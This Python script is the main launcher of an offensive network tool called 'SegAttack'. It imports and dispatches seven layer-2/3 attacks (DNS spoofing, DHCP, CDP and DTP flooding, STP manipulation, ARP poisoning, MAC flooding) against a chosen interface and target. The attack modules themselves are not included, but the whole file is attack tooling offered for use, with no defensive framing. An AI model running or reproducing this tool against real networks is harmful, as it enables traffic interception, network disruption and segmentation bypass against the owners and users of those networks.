#!/usr/bin/env python3
from scapy.all import *
import argparse
import sys
import os

# Import attack modules
sys.path.append('attacks')
from dns_spoof import run_dns_spoof
from dhcp_flood import run_dhcp_flood
from cdp_flood import run_cdp_flood
from stp_manip import run_stp_manip
from dtp_flood import run_dtp_flood
from arp_poison import run_arp_poison
from mac_flood import run_mac_flood

def main():
    parser = argparse.ArgumentParser(description="SegAttack: L2/L3 Segmentation Attacks")
    parser.add_argument('--interface', '-i', required=True, help="Network interface (e.g., eth0)")
    parser.add_argument('--attack', required=True, choices=['dns', 'dhcp', 'cdp', 'stp', 'dtp', 'arp', 'mac'], help="Attack type")
    parser.add_argument('--target', '-t', help="Target IP/MAC (if applicable)")
    parser.add_argument('--duration', '-d', type=int, default=60, help="Duration in seconds")
    parser.add_argument('--count', '-c', type=int, default=1000, help="Packet count (for floods)")
    args = parser.parse_args()

    conf.iface = args.interface
    print(f"[+] Starting {args.attack} attack on {args.interface} for {args.duration}s")

    attack_map = {
        'dns': run_dns_spoof,
        'dhcp': run_dhcp_flood,
        'cdp': run_cdp_flood,
        'stp': run_stp_manip,
        'dtp': run_dtp_flood,
        'arp': run_arp_poison,
        'mac': run_mac_flood
    }

    try:
        attack_map[args.attack](args.interface, args.target, args.duration, args.count)
    except KeyboardInterrupt:
        print("\n[+] Attack stopped by user.")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
